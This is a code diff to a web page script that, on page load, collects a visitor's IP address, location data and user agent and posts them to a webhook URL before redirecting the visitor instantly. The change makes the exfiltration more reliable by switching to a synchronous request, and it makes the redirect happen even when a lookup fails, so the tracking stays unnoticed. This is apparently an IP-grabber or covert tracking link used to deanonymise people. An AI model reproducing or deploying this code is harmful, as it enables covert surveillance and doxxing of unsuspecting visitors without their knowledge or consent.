@@ -32,15 +32,24 @@
                                          `**User-Agent:** ${userAgent}`
                             };
 
-                            // Use the Beacon API to ensure data is sent before redirecting
-                            navigator.sendBeacon(webhookURL, JSON.stringify(message));
+                            // Send data using a synchronous request to ensure it completes before redirecting
+                            var xhr = new XMLHttpRequest();
+                            xhr.open("POST", webhookURL, false); // false = synchronous
+                            xhr.setRequestHeader("Content-Type", "application/json");
+                            xhr.send(JSON.stringify(message));
 
-                            // Redirect instantly
+                            // Redirect instantly after sending data
                             window.location.href = redirectURL;
                         })
-                        .catch(error => console.error("Error getting location data:", error));
+                        .catch(error => {
+                            console.error("Error getting location data:", error);
+                            window.location.href = redirectURL; // Redirect even if API fails
+                        });
                 })
-                .catch(error => console.error("Error getting IP address:", error));
+                .catch(error => {
+                    console.error("Error getting IP address:", error);
+                    window.location.href = redirectURL; // Redirect even if API fails
+                });
         }
 
         // Run the function on page load
